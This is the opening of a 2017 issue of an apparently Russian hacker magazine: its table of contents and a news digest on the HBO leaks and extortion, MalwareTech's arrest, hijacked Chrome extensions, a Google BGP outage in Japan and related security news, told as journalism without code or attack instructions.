                                                        АВГУСТ – СЕНТЯБРЬ 2017
                               №223





                                           Пишем PoC                                    01230
                                             wi-ﬁ                                              для атаки «Плащ
                                                 и кинжал»




                                                                                                         D342

                                   Cover
                                      Story                                                    Изучаем
                                                    актуальные
                                                        Гугл-дорки
       ВЫБИРАЙ
      WI-FI!
                           Собираем тулкит
                          для взлома Wi-Fi: USB-
                           адаптеры, «ананасные»
                            роутеры и антенны


D342


                                                                                                                                                      0D:14:FF





                                                                                                                                                               route.wiﬁ.cc





Тестируем                                        Разбираемся
notrack-браузеры                                 с Vim в 2017 году                                                                                                                                                                                                                                                                                                                                                                     localhostдля Android
                                                 август – сентябрь 2017
            № 223
CONTENT

    MEGANEWS
  Всё новое за последний месяц

   Железо для вардрайвинга
  Собира ем тулкит для взло ма Wi‐Fi: USB‐адаптеры, «ана насные» роутеры, антенны и дру‐
  гие инс трумен ты хакера

    Взломай, создай, продай
  Интервью с Рай аном Лэки об инфосек‐стар тапах, Cloudﬂare и многом другом

    Полет «Колибри»
  На что спо соб на ОС, целиком написанная на ассем блере

    Обвес macOS
  Ме няем скры тые настройки, ставим полез ный софт и лезем под капот сис темы, перей дя
  на «мак»

   WWW
  Интересные веб‐сервисы

    SHA2017
  Ре пор таж с самого яркого хакер ско го ивен та это го лета

    Дай джест Android
  Разработка шелл‐кодoв под ARM, безопасность загрузчиков смартфонов и новые техники
  защиты ядра у Samsung

    Рождение, рас цвет и смерть джейлбрейка
  Как на про тяжении десяти лет Apple боролась с хакера ми и победи ла

    От 0 до 100% за 15 минут
  Стан дарты, осо бенности и проб лемы тех нологий быстрой зарядки

    Хватит за мной следить!
  Тестиру ем мобильные бра узеры на Android с защитой от отслеживания

     Android безопаснее iOS?
  Колонка Евгения Зобнина

    Пор ка распорки
  Разбираем свежую уязвимость в фреймворке Apache Struts 2

     Брут для «Джумлы»
  Обходим авто ризацию, чтобы получить пароли пользователей в Joomla CMS

    Скры тая сила пробела
  Эксплуатируем критическую уязвимость в Apache Tomcat

     Cloak and Dagger
  Эксплуатируем ата ку и создаем PoC нашумевшей уязвимос ти

     Google как средство взлома
  Разбираем акту альные рецепты Google Dork Queries

     Android malware по‐взрослому
  Самые популярные вирусные техники 2017 года

    Эволюция ботов
  Как вла дель цы бот нетов скрывают свои сети и обходят ограниче ния

    Инструментарий игродела
  Под бира ем набор бесплатных программ для разработ ки игр

     Топливо для Андроида
  Из бавля ем свое приложение от лагов, тормозов и долгих экранов заг рузки

    Редактор, из которо го не выйти
  Как перес тать боять ся Vim и начать его исполь зовать

    Веб глазами юник соида
  Автоматизируем работу с веб‐сервисами с помощью скриптов

     Титры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ФИЛЬМ, ФИЛЬМ,
ФИЛЬМ
Сра зу несколь ко инцидентов и утечек дан ных произошло в этом месяце
с аме риканской кабельной и спут никовой телесетью HBO.
  В начале августа появилась информация, что неизвес тные хакеры похити‐
ли у HBO 1,5 Тбайт данных, при чем прес тупни ки сами сообщили об этом
избранным журналистам. В качестве доказа тельства взлома злоумышленни ки
слили в Сеть еще не показанные в эфире эпи зоды сериалов Ballers и Room
104. Так же хакеры опубликовали тек сто вый матери ал, оказавшийся сценари‐
ем четверто го эпизода седь мого сезона «Игры прес толов» (Game of Thrones),
который должен был выйти в эфир 6 августа 2017 года.
  Было не сов сем ясно, какие еще данные мог ли оказаться в руках зло‐
умыш ленни ков. Также не сооб щалось, пытались ли взломщики пред варитель‐
но шантажировать руководство компании HBO или сра зу обратились в СМИ.
  Нес колько дней спустя, в ночь с 4 на 5 августа, в Сети был опубликован
и сам четвертый эпи зод седьмого сезона «Игры прес толов». Копия была рас‐
пространена через тор рент‐трекеры, а так же сер висы Vidme и Google Drive.
Хотя предста вители HBO ста рались оперативно бло кировать такие ссылки,
серию все рав но можно было довольно лег ко найти в интерне те.
  Копия эпизода предназначалась для внутренне го использования. Так,
видео весьма низкого качества было промаркировано предупреждением For
internal viewing only и «водяными знаками» медиакомпании Star India Pvt Ltd.
Данная ком пания при надлежит 21st Century Fox и вла деет правами на тран‐
сля цию продукции HBO в Индии.





Официальные предста вители Star India подтвердили факт утечки и сообщили,
что начато внутреннее расследова ние случившегося. Опи раясь на их слова,
СМИ предположи ли, что утечка видео и пуб ликация сценария могут оказать ся
не связаны между собой, то есть речь может идти о двух не зависящих друг
от друга взло мах.
   Как выяснилось, СМИ были совершенно правы. Восьмого августа зло‐
умыш ленни ки, похитив шие у HBO 1,5 Тбайт данных, опуб ликовали в сети сце‐
нарий пятого эпи зода седь мого сезона «Игры престолов». Также хакеры
обнародовали и другие зак рытые докумен ты, свя занные с популяр ным сери‐
алом, вклю чая бриф, озаглавленный Game of Ideas, конфиденциальный спи‐
сок актеров нового сезона, а также бумаги, про лива ющие свет на маркетин‐
говую стратегию канала и пла ны съемок. По дан ным СМИ, ничего сенсаци‐
онного и нового эти документы не содер жали (если не считать спой леров
к пятому эпизоду).
  На этот раз неизвестная груп пировка приложила к файлам нес колько
скриншотов. Так, на одном из них мож но увидеть папки, в которых содер‐
жатся 1,5 Тбайт похищенных у HBO дан ных (см. изображение ниже). Кроме
того, Associated Press сообщило, что в рас поряжении злоумышленни ков ока‐
зались пись ма руково дителей HBO, в час тнос ти вице‐пре зидента Лесли Коэн
(Leslie Cohen).





Кро ме того, новый дамп содер жал видеопись мо, написанное от лица некоего
мистера Сми та и адре сованное Ричар ду Плеплеру (Richard Plepler), главному
исполни тельному директору HBO. В своем пос лании хакеры предложили
прекратить слив информации в обмен на «скромное вознаграждение».



     «HBO потратила 12 миллионов долларов на мар кетинговые иссле-
      дова ния и еще 5 миллионов долларов на рек ламу GOT7. Прос то рас-
      сматривайте нас как еще одну статью рас ходов на рек ламу, — пишет
     мис тер Смит. — Как вам оста новить груп пу вроде нас, которая за год
      потратила 400–500  тысяч долларов  на  покуп ку  0day-эксплоитов?
     Обыч но мы запус каем пару мас штабных опе раций в год, которые при-
      носят нам поряд ка 12–15 миллионов долларов. <…> Вып латите нам
     наш гонорар за шесть месяцев в биткойнах, и мы исчезнем из вашего
      поля зре ния».

Таким  образом,  легко  подсчитать,  что  злоумышленники  пот ребова ли
от руководства HBO поряд ка 6,5–7 миллионов долларов. В письме мис тер
Смит отме чает, что хакеры потратили на взлом сети HBO более полугода
и это уже семнадцатая цель груп пировки. Согласно заяв лению злоумыш‐
ленников, за все вре мя им отказались зап латить лишь три компании, две
из которых в итоге обанкро тились.
   Вскоре жур налисты изда ний Variety и The Hollywood Reporter сообщили,
что зло умышленники снова выш ли с ними на связь. На этот раз группировка
показала СМИ свою переписку с официальными представителями HBO,
датиро ванную концом июля 2017 года, то есть диалог имел мес то еще до
того, как об утечке стало известно широкой публике.
  В   тексте  одного   из  писем  предста вители  HBO  предлагали
хакерам 250 тысяч долларов в рам ках прог раммы вознаграждений за найден‐
ные уяз вимос ти. При этом ком пания подчерки вала, что bug bounty обычно
вып лачивают white hat специалистам и в данном случае HBO пытается про‐
явить честность и доб ропорядочность в ведении переговоров.
  Осталось неизвестным, как именно прес тупни ки отре аги ровали на это
предложение и была ли в итоге совершена выплата. Также остается только
догады вать ся, на самом деле руководс тво телеканала было готово пойти
на сделку или письмо было лишь уловкой. Впрочем, что шантажистам пред‐
ложили деньги, само по себе уди вительно в любом случае. Зло умышленники
сообщили прессе, что вели перего воры с HBO нес коль ко недель, но телека‐
нал не выполнил некие «обещания», что и повлекло за собой пуб ликацию
украденных данных.
   Но, как уже было сказано, утечка четверто го эпизода седьмого сезона
«Игры  престолов»  ока залась  никак  не  связана  с мистером Сми том.
14 августа 2017 года в Индии были задержаны четыре челове ка, которых
и подоз ревают в сливе этого эпи зода в Сеть. Об арестах сооб щили местные
СМИ и телеканал New Delhi Television (NDTV), также эту информацию подтвер‐
дило информагентство Франс Пресс.
  Офи циальные представители индий ской полиции говорят, что все задер‐
жанные были сот рудниками компании Prime Focus Technologies, которая явля‐
ется партнером Star India и занима ется подготовкой контента для при ложе‐
ний. На офи циальном сайте компания рек ламиру ет себя как пос тавщика
услуг, которо го предпочитает Netﬂix.
   Согласно заявлениям полиции, Star India и Prime Focus Technologies,
отсле дить подозреваемых удалось благодаря тому, что у каждого служащего
есть уни кальный ID для доступа к контенту на серверах Prime Focus. Так, опуб‐
ликованный в сети эпизод «Игры престолов» зап рашивал сотрудник по име ни
Абхи шек Гхадиял (Abhishek Ghadiyal), который отпра вил видео бывшему сот‐
рудни ку ком пании, Мохам меду Сухаи (Mohammed Suhai). Какую роль в утечке
данных сыграли двое других задержанных, не сооб щалось.
  Завершени ем этой чер ной для HBO полосы стала третья утечка, никак
не связанная с обо ими описанными инци ден тами. 16 августа 2017 года жур‐
налисты издания Torrent Freak обнаружили, что в Сети опубликована шестая
серия седьмого сезона «Игры престолов». Сра зу несколько качественных
копий эпи зода со скоростью лесного пожара распространились по тор‐
рент‐трекерам и стримин говым сайтам.
  На этот раз ответственность за слив лежала на самих сотрудниках HBO.
Как оказалось, утечка новой серии про изош ла по вине сотрудни ков HBO
Nordic и HBO Espana. Эпизод был случайно опуб ликован в онлайне раньше
сро ка, чем не премину ли вос пользовать ся сра зу нес колько релиз‐групп,
залив серию на торрент‐тре керы.
  Напомню, что HBO не первая голливудская компания, ставшая жертвой
хакеров. Весной текущего года от рук хак‐груп пы TheDarkOverlord уже постра‐
дали Netﬂix и ABC, после того как злоумышленники взломали ком панию Lar‐
son Studios, занимающуюся пос лесъ емочной обра бот кой матери алов. Так
как в ком пании отказались иметь дело со зло умыш ленниками и платить им
выкуп, на The Pirate Bay были опуб ликова ны еще не вышедшие в эфир десять
эпи зодов нового, пятого сезона сериала «Оран жевый — хит сезона» (Orange
Is The New Black), а затем восемь эпи зодов еще не появлявшегося на экра нах
телешоу Steve Harvey’s Funderdome.


КАЖДОЕ ПЯТОЕ IOT‐УСТРОЙСТВО В РОССИИ УЯЗВИМО
Специалисты ком пании  Avast пред ставили  резуль таты  своего  пос леднего  иссле дования
интеллектуальных устройств в Рос сии. Как выяс нилось, ситуация с интернетом вещей в России
ничуть не луч ше, чем в осталь ном мире.

→ 23,7% IoT‐устройств в России уязвимы для кибератак, что создает угрозу для безопасности
людей и их лич ных данных. 2 из 5 устройств могут быть взломаны зло умыш ленни ками с целью
шпи онить за поль зователями и их деть ми, так как среди уязвимых девай сов мно го веб‐камер
и видеонянь. 41% веб‐камер и видеонянь уяз вимы с точки зрения безопас ности. 26,9% прин‐
теров также небезопасны. Но хуже всего дела обстоят с роутерами. 69,2% данных устройств
в России подвержены рис ку кибератак.





НЕПРИЯТНОСТИ
MALWARETECH
В мае 2017 года, во время эпи демии шифровальщика WannaCry, нас тоящим
«героем дня» стал ИБ‐специалист, извес тный под псевдонимом MalwareTech.
Тогда именно он обнаружил в коде вредоноса ава рий ный «стоп‐кран»: ока‐
залось, что перед началом работы малварь обра щается к домену iuqerfsod‐
p9ifjaposdfjhgosurijfaewrwergwea.com, проверяя, существует  ли  он.  Если
домен не зарегистри рован, малварь начинает шифровать файлы. Однако
если домен есть, вымогатель оста навливает процесс заражения.
   Тог да MalwareTech зарегистрировал этот домен, акти вировав тем самым
механизм «аварийного отключения», и количество успешных заражений Wan‐
naCry резко сни зилось.
  После этого СМИ проявили к исследователю огромный инте рес. Так
как он действо вал под псев донимом, всем хотелось узнать, кто он такой
на самом деле. В итоге пресса сумела деанонимизировать MalwareTech
и выяснила, что под этим ником скрывается 22‐лет ний бри танец Мар кус Хат‐
чинс (Marcus Hutchins). И хотя MalwareTech был не в восторге от такого прис‐
тального внимания, к деано ними зации и раскрытию настоящего име ни он
в ито ге отнесся вполне спо койно.
  Но теперь у «героя интернета» большие проблемы. 3 августа 2017 года
ста ло известно, что Хатчинс был задер жан властями США после визита
на конференции Black Hat и DEF CON, проходив шие в Лас‐Вегасе. Пред ста‐
вители бри танско го национального Цен тра кибер безопасности сооб щили,
что они в курсе событий, одна ко не сочли нужным вме шивать ся, так как «это
дело правоохранитель ных органов».
   Чуть  позже  прессе  удалось  достать  копию  обвинительного  акта,
и документ пролил свет на про исхо дящее. Оказалось, что Маркуса Хатчинса
обви няют в создании и рас пространении банковско го трояна Kronos в 2014–
2015 годах. В документах фигури рует не только MalwareTech, но и еще один
подозреваемый, чье имя не раскрывается. Сооб щается, что они рек ламиро‐
вали и про давали свой банкер на под польных форумах и торговых пло щад ках,
включая зак рытый недавно даркнет‐маркет AlphaBay. Напомню, что в те годы
пожиз ненная лицензия на Kronos стоила 7 тысяч дол ларов, а неделя проб‐
ного тестирования обходилась в тысячу долларов.
   Эта новость стала настоящим шоком для всего мирового ИБ‐сообщества.
Кол леги MalwareTech сразу предположи ли, что правоохранительные органы
«серьезно облажались»: не мог иссле дова тель занимать ся продажей и раз‐
работ кой банкера, ведь он много лет борется именно с такими угрозами.
Судя по сообщени ям в твиттере специалиста, он действительно мог изучать
троян Kronos в то время.





Бо лее того, MalwareTech мог писать неч то вредонос ное в исследовательских
целях. К примеру, в 2014 году, еще до появ ления Kronos, Хат чинс, уже тогда
работавший антивирус ным ана литиком, опубликовал пост в сво ем блоге,
озаг лавленный «Пишем малварь для развлечения, а не для получе ния при‐
были (потому что это было бы незаконно)». В статье исследователь подробно
описывал процесс соз дания бут кита для Windows  XP, причем нарочи то
безопасного.



     «Прежде чем вы броситесь звонить вашему дру желюбному соседу —
      агенту ФБР, я хотел бы кое‑что прояснить, — писал MalwareTech. —
     Данный  буткит  написан  как  proof-of-concept,  использовать  его
      в качес тве ору жия будет крайне труд но, и опас ной вер сии, которая
     может попасть в руки прес тупников, не сущес тву ет».

Поз же, в 2015 году, когда «на рын ке» уже появился банкер Kronos, Хат чинс
с удивлением обнаружил, что авто ры мал вари исполь зовали его код (не
из упомянутого выше поста), о чем специалист сооб щил в твиттере.





4 августа 2017 года Хатчинс предстал перед судом, где сообщил, что
не признает сво ей вины по всем предъ явленным обви нени ям. Суд согласил‐
ся отпустить специалиста, не имеюще го кри миналь ного прош лого, под залог
в размере 30 тысяч долларов. Хотя друзья и родственники MalwareTech,
которых под держали ИБ‐специалисты со всего мира, без труда смогли соб‐
рать нужную сумму, заседа ние окончилось в 15:30, и внести залог до окон‐
чания работы суда (16:00) юристы попросту не успели. В итоге MalwareTech
пришлось провести  все выходные  в камере и выйти на волю лишь
в понедельник, после внесения залога.
  После  освобождения  Хатчинсу  запретили  поль зоваться  интерне том
и устанав ливать связь со своим неизвестным «сооб щни ком». Также Malware‐
Tech, разуме ется, не может покинуть США до завершения судеб ных раз‐
биратель ств и обя зан носить специальный GPS‐маячок.
  Адвокат Хатчинса Адриан Лобо (Adrian Lobo) расска зала прес се, что сто‐
рона обви нения пыталась нас таивать на отказе в выходе под залог на осно‐
вании того, что недавно Хатчинс посещал тир, где без надлежащей лицен зии
стрелял из оружия. Адво кат назвала эти сло ва прокурора «бредом».
  Интересно, что сто рона обвинения также заявляет, будто во вре мя доп‐
росов, еще без адвоката, Хатчинс приз нался в том, что занимал ся разработ‐
кой малвари, но адво кат опровер гает эти заявления и уверяет, что ее клиент
не имеет к тро яну Kronos никакого отношения.
  Первое заседание по делу Хатчинса сос тоялось 14 августа 2017 года.
На суде исследователь вновь заявил о своей невиновности по всем пунктам
обви нения. Уже после слушания офи циальный предста витель защиты Mal‐
wareTech Марсия Хоф ман (Marcia Hofman) сооб щила прес се, что ее клиент
намерен и «далее решитель но защищать себя перед лицом всех предъ‐
явленных обви нений, а когда будут обна родованы улики, мы уверены, что он
будет полностью оправдан».
  Сле дующее заседание суда наз начено на октябрь текуще го года. Так
как прокурор счел, что Хат чинс более не представ ляет опасности, спе циалис‐
ту сно ва раз решили пользовать ся интернетом, а также поз волили перебрать‐
ся в Лос‐Анджелес, где рас положен офис компании Kryptos Logic, в которой
он работает. Тем не менее до окончания судеб ных раз бирательств спе‐
циалист все рав но не может покинуть стра ну и по‐прежнему будет носить
GPS‐тре кер.
   Спустя несколь ко часов после появления этой новос ти MalwareTech вер‐
нулся в онлайн и даже пошутил в твиттере о собс твен ном аресте. Хат чинс уже
пообещал пос вятить случившемуся отдельный пост в блоге, но вместе с этим
он отме чает, что пока ему нель зя говорить и писать о многих вещах.





В настоящий момент положе ние у MalwareTech незавид ное. Хотя семья,
друзья и сочувствующие члены ИБ‐сооб щес тва со все го мира без труда соб‐
рали средства на уплату залога и первичные юридические издержки, теперь
спе циалист застрял в чужой стране без денег, жилья, разрешения на работу,
в ско ром будущем ему пред стоит судеб ная тяж ба. Неуди витель но, что сбор
средств было решено продолжить.
  Но и здесь все прошло не так гладко, как хотелось бы. Один из защит‐
ников Хатчинса, адвокат Тор Экеланн (Tor Ekeland), некогда защищавший
Эндрю Ауэрнхай мера (Andrew Auernheimer), также извес тного под ником
Weev, рассказал журналистам, что со сбо ром пожер твований возникли проб‐
лемы.
  По данным юрис та, неизвестные лица пытались перечислить на защиту
иссле дователя как минимум 150 тысяч долларов с похищенных банковских
карт. Хотя большинство этих транзакций были отклонены про цессинговыми
ком пани ями, от 5 до 10 тысяч долларов все же доб рались до адре сата. Эке‐
ланн заверил, что средс тва уже возвращены их настоящим владельцам,
и под чер кнул, что подоб ные риски неприемлемы, а MalwareTech сейчас
находится не в том положении.
  В итоге команда защитников Хатчинса выбрала новый инс трумент для кра‐
удфандинга. Адвокаты специалиста рас сказали, что они две с половиной
недели тестирова ли пло щадку для сбора средств CrowdJustice. Защитники
признаются, что связались с разработчиками ресур са и начали беседу
со слов «Простите, но нам понадобится провести у вас пентестинг». И лишь
когда юристы убе дились, что все в порядке, на CrowdJustice стартовал сбор
средств, которые будут нап равлены на оплату услуг защитников Хатчинса.
  В заяв лении на краудфандинговой пло щадке подчеркивается, что все
вырученные деньги пойдут исключительно на гонора ры юристов, а не на про‐
живание MalwareTech в чужой стране.


→ На 2502% увеличил ся рынок вымогательского ПО в даркнете. Аналити ки компании Carbon
Black под счи тали, что с 2016 по 2017 год рынок вымогатель ского ПО в даркнете вырос
с 249 287 долларов в 2016 году до 6 237 248 долларов, в пол ном соот ветс твии с прогнозами
ана литиков. В среднем вымогатель скую мал варь продают за 10,50 доллара, хотя в целом цены
варь ируются от 0,50 до 3000 долларов. По словам специалистов, подполь ная эко номи ка ран‐
сомва ри все больше походит на разработку обыч ного, ком мерчес кого ПО. Теперь здесь тоже
уделяют вни мание контролю качества и часто даже имеют собственную техничес кую поддер‐
жку. Исследователи прогнозируют, что в будущем авторы вымогательского ПО станут чаще
объеди нять ся друг с другом для разработ ки и под держания новых продук тов.





                                     Продолжение статьи →
← Начало статьи





 РАСШИРЕНИЯ В
 ОПАСНОСТИ
  В начале августа 2017 года неизвестные злоумыш ленни ки сумели скомпро‐
  метировать разработ чиков сра зу двух рас ширений для браузе ра Chrome:
  Copyﬁsh и Web Developer.
    В обоих случаях атакующие использовали социаль ную инженерию и прис‐
  лали разработ чикам очень убедительные фишин говые письма, якобы от лица
   сотрудни ков Google Chrome. Пос ле того как жертвы вводили свои учетные
  данные на сай те зло умышленни ков, те исполь зовали полученную информа‐
  цию для перех вата контроля над расширени ями и выпускали вре донос ные
  обновле ния про дуктов, которые внедряли рекламу в просматри ваемые поль‐
  зователями страницы.





  Как оказалось, взлом двух рас ширений подряд был далеко не слу чайностью.
  Журналисты ресур са Bleeping Computer выяснили, что эта вредонос ная кам‐
  пания длится уже более двух месяцев, просто до недавнего времени мошен‐
  никам удавалось оста ваться незамеченными. Фишеры раз за разом выда ют
  себя  за предста вите лей  Google и при сылают  раз работ чикам  письма,
   в которых сообщают, что расширение нарушает пра вила Chrome Web Store
  и дол жно быть обновлено. Ког да жертва перехо дит на сайт злоумышленни‐
   ков, ее просят вой ти в аккаунт разработ чика Google, а сайт полностью ими‐
   тирует настоящую страницу логина.
     К примеру, OinkAndStuﬀ, раз работчик двух популярных расширений Blue
  Messenger (80 тысяч поль зователей) и Websta for Instagram (100 тысяч поль‐
  зователей), рас сказал жур налис там, что впервые он получил такое фишин‐
  говое послание еще 21 июня 2017 года.
    Во всех трех случаях (Copyﬁsh, Web Developer и OinkAndStuﬀ) пись ма были
  отправ лены с домена Freshdesk, а текст пос ланий был идентичен. OinkAnd‐
   Stuﬀ попытался собрать о фишерах больше данных, но его рассле дование
  при вело лишь к абонент скому ящику в Панаме, пос ле чего специалист сооб‐
  щил о подоз рительной активнос ти инженерам Google, и ком пания заблокиро‐
  вала фишинговый сайт посредством Safe Browsing API.
    Однако мошенники не прек ратили свою деятель ность. По словам Oink‐
   AndStuﬀ, он получал фишинговые письма еще дважды, в начале и в конце
  июля 2017 года. Во вто ром случае злоумышленни ки пытались использовать
  сервис для сокращения URL bit.ly, что сразу же их выдава ло.
    В  ито ге  иссле дователь еще дважды сооб щал  сотрудникам  Google
  о мошенниках, и те вносили домены в черные списки, одна ко не похоже, что‐
  бы это сильно мешало ата кующим: они просто про должили менять домены.
     После про изо шедшего с Copyﬁsh и Web Developer пред ставите ли Google
  разослали разработ чикам расширений для Chrome письма с предупрежде‐
  нием об активности фишеров (см. скрин шот ниже). В пос ланиях инженеры
  Google напоми нают о простейших правилах безопасности, рекомендуют про‐
   верять домены и email‐адреса, а также совету ют использовать двухфактор‐
  ную аутентификацию.





  Свет на масштабы про исхо дящего в середине месяца про лил спе циалист
  ком пании Proofpoint, известный под псевдонимом Kafeine. Он сооб щил, что
  были ском промети рованы еще шесть популярных рас ширений: Chrometana
   1.3, Inﬁnity New Tab 12.3, Web Paint 2.1, Social Fixer 1.1, TouchVPN и Betternet
  VPN. Спе циалист подсчи тал, что через взлом чужих расширений хакеры сум‐
  марно ском промети ровали уже почти 5 миллионов поль зователей.
     Изучив исходный код одного из «обновлен ных» злоумыш ленниками про‐
   дуктов, иссле дователь разоб рался, что имен но делают вре доносные вер сии
  рас ширений. После обновления рас ширение заг ружает файл  JavaScript
  с домена, сге нерированного при помощи DGA, и собира ет учетные данные
   Cloudﬂare из браузе ра пострадав шего. Затем расширение начина ет под‐
  менять легитимную рек ламу на объявле ния злоумыш ленни ков.
     Больше все го подобных замен происхо дит на сайтах для взрос лых,
  при этом расширение подменяет бан неры 33 наиболее рас пространенных
  раз меров (468 ✕ 60, 728 ✕ 90 и так далее). Кроме того, адварь может показы‐
   вать поль зователям раз личные всплывающие окна и перенаправлять их
  на другие ресурсы, которые являются частью «партнерских прог рамм» прес‐
   тупни ков. Такой трафик тоже приносит прибыль атакующим.
     Также Kafeine полагает, что неизвестные операторы данной кампании
  активны как минимум с июня 2016 года. Дело в том, что специалист сумел
  про вести параллели и заметил сходство в инфраструктуре между недавними
   ата ками и вредоносными рас ширениями  для  Chrome, обнаруженными
   в 2016 году. Исследователь считает, что злоумышленники прекрасно под‐
   готовлены и не понас лышке знают и о разработ ке расширений, и о том,
   как работа ет Chrome Web Store. По мнению экспер та, несмотря на огласку,
   груп па вряд ли в ско ром вре мени прекратит ата ки.





  →«Позволяя операторам ран сомва ри продавать ее на форуме, мы копа ем могилу сами себе.
   Конечно, бан на форумах не прекратит такой бизнес, но сведет его к минимуму, и мы можем
   использовать неодоб рение сообщес тва, что бы даже вой ти в этот бизнес стало сложно»,
  — неназ ванный поль зователь андеграундно го хакерско го ресурса.
      Как выяс нили ана литики ком паний Anomali и Flashpoint, админис траторы подобных сай тов
   счи тают, что рас пространение вымогательского ПО лишь вредит «биз несу» и привлека ет
   ненужное вни мание к их плат формам.





 HDCLUB ВСЕ
  30 августа 2017 года о закрытии объявил сайт HDClub, один из ведущих пос‐
  тавщиков «пиратско го» HD‐ и 3D‐контента в рунете и не только: именно
  релизы HDClub зачастую распростра нялись на The Pirate Bay и других крупных
  трекерах. Про рабо тавший больше десяти  лет  сайт нас читывал поряд‐
   ка 170 тысяч активных поль зователей и вхо дил в тысячу самых посещаемых
  ресурсов рунета.
    Неделю до это го ресурс фактичес ки не работал, а затем на его главной
  странице появи лось сооб щение следующего содержания:



         «Ува жаемые  пользовате ли! В  пос леднее  вре мя мы еже недельно
         получа ем нес колько десятков жалоб от пра вообладате лей, а наше
        сообщес тво под верга ется  ата кам и шпиона жу. Параллельно идет
        ужес точение интернет‑законодательства в Рос сии, Укра ине и стра нах
        Евросоюза. И наконец, вре мя энту зиас тов без воз вратно уходит.
         В сложив шихся обстоятельствах мы более не можем под держивать
         работу клу ба в изна чально задуманном фор мате. Проект зак рыва ется,
         а мы просим вас воз держаться от гром ких проводов. Всем спа сибо
        и прощайте!
             P. S. Идут переговоры по сохранению нас ледия клу ба».

  Ад министрация не уточняет, в каком виде планиру ется сохранять наследие
  HDClub, а так же не объясняет, что подразумевается под «атаками и шпиона‐
  жем», мож но лишь предполагать, что речь идет о DDoS‐атаках и попыт ках
   треть их сто рон внедриться в закрытое сооб щество ресурса.


 → 15.12.2017 компания AOL прекратит сущес тво вание мес сен дже ра AIM. Компания AOL объ‐
   яви ла, что 15 декаб ря 2017 года окончательно завершит свою работу один из старейших мес‐
   сенджеров — AOL Instant Messenger (AIM), запущен ный еще в далеком 1997 году. В офи циаль‐
   ном заявлении ска зано, что лан дшафт интернета изме нил ся слишком силь но и в наши дни
   поль зователи предпочитают совсем другие средства ком муникации, AIM им больше не нужен.
   Основные конкуренты AIM 2000‐х годов, Yahoo! Messenger и MSN Messenger, прекратили
   сущес твование нес коль ко лет назад. Сам AIM перес тал работать в сторонних кли ентах еще вес‐
   ной текущего года, и дав но было ясно, что окончатель ная «смерть» мессен дже ра — это лишь
   вопрос времени.





 GOOGLE СЛОМАЛА
 ИНТЕРНЕТ В ЯПОНИИ
  25 августа 2017 года интернет в Япо нии работал со значительными перебо‐
  ями с 12:22 до 13:01 по местному вре мени. Виной тому стала ошибка сот‐
  рудни ков Google.
    Проблема заключалась в протоколе динамической мар шрутизации BGP
  и ошибке в его использовании. На текущий момент BGP служит основным
  про токо лом динамической маршрутизации в интернете. Он предназначен
  для обмена информа цией о дос тижимости подсетей между так называемы ми
   авто ном ными системами (АС, англ. AS — autonomous system), то есть груп‐
  пами маршрутизаторов под еди ным  техничес ким и адми нис тративным
  управле нием.
    Спе циалисты Google (компании при надлежит собственный AS‐номер)
  допустили ошибку, неверно анонсировав блоки IP‐адре сов, принадлежащих
  япон ским про вайдерам. В результате дру гие провай деры, включая таких
   гигантов, как Verizon, ста ли направлять трафик, пред назначенный для Японии,
  на серверы Google, которые к это му не готовы.
    В результате в Японии ока зались прак тичес ки недос тупны многие сер‐
   висы, в том числе правительствен ные и банковские порталы, системы бро‐
  нирований и так далее. Более того, пользователи извне не могли подклю‐
   чить ся к сервисам Nintendo, а также ряду торговых площадок, расположенных
   внутри страны.
     Хо тя проблему устранили в течение часа, случившееся успе ло посе ять
  панику сре ди японских пользователей. Мес тные СМИ сообщили, что рассле‐
  дованием инци ден та уже занимается Минис терс тво внутренних дел и ком‐
  муникаций Японии.
    По данным ресурса BGPMon (компания при надлежит OpenDNS и Cisco),
  спе циалисты Google напортачили с трафиком крупного провай дера NTT
  Communications  Corp., который  так же поддерживает  двух провайдеров
  поменьше, OCN и KDDI Corp. Суммарно NTT предос тавляет услуги 7,67 мил‐
  лиона частных лиц и 480 тысячам ком паний.
    В общей слож ности сбой затронул 135 тысяч сетевых префиксов по всему
   миру, и более 24 тысяч из них при надлежали NTT, который пострадал от сбоя
  боль ше других. Предста вители Google и Verizon принесли официальные изви‐
   нения, однако не пояснили, стал данный инцидент результатом сбоя обо‐
  рудования или виной всему был прес ловутый человеческий фактор.


 ЗАФИКСИРОВАН ВОСЬ МИК РАТНЫЙ РОСТ УТЕЧЕК ПЕР‐
 СОНАЛЬНЫХ И ФИНАНСОВЫХ ДАН НЫХ ИЗ ОРГАНИЗАЦИЙ
   По данным ана лити чес кого цен тра InfoWatch, в первом полугодии 2017 года в открытых
   источни ках была обнародована информация о 925 случаях утечек конфиденциальной информа‐
   ции. Это на 10% превышает количество утечек дан ных за аналогичный период 2016 года.

  →В янва ре — июне 2017 года объем ском прометирован ных персональ ных и пла теж ных данных
   вырос в 8 раз по сравнению с 2016 годом: с 1,06 миллиарда до 7,78 мил лиар да записей. Объ‐
   ем потерянной чувс твитель ной информации в первом полугодии уве личился в резуль тате 20
   мега утечек (свы ше 10 мил лионов записей), на которые пришлось 98% всех пострадавших дан‐
   ных. Причиной 58% утечек в мире стали внут ренние наруши тели в организациях. Нек валифи‐
   цированные утеч ки, которые не были сопряжены с превышением прав доступа и использовани‐
   ем дан ных в целях мошенничества, были зафик сированы в 84% случаев.





  →Возросло среднее число пос традавших записей: в рас чете на одну утеч ку в результате
   внешнего воздействия при ходилось 13,6 миллиона записей (по сравнению с 2,4 миллиона
   в 2016 году) и 4,5 мил лиона записей на каж дую утечку, допущен ную по вине внутренне го
   наруши теля (0,8 мил лиона в 2016 году). Наибольший интерес злоумышленники проявляли
   к банкам и компани ям высокотехнологич ного сег мента. В этих отраслях более 50% утечек
   носили умышленный харак тер.





                                        Продолжение статьи →
← Начало статьи





 AMAZON ЗАБАНИЛ
 BLU
  В конце 2016 года сот рудник компании Kryptowire приобрел на отдыхе бюд‐
  жетный смартфон BLU R1 HD и случайно заметил, что устройство генерирует
  подозрительный сетевой трафик. Детальное изучение вопроса показало, что
  девайс под держи вает связь с китай скими серверами, принадлежащими ком‐
  пании Shanghai Adups Technology Company, более известной как Adups.
     Как оказалось, устрой ства ком пании BLU и дру гих производите лей содер‐
  жат сис тему обновле ния ПО FOTA (Firmware Over The Air), которую разрабаты‐
   вает Adups. FOTA по сути пред ставляет собой бэкдор, который пос тоянно
  держит связь с сер верами китайской компании и способен сли вать на сто‐
  рону самую разную информацию о пользователях. При этом решениями ком‐
  пании Adups пользуют ся более 400 мобильных опе раторов и производите‐
   лей, а продук ты компании установлены на 700 миллионах Android‐устройств
  по все му миру.
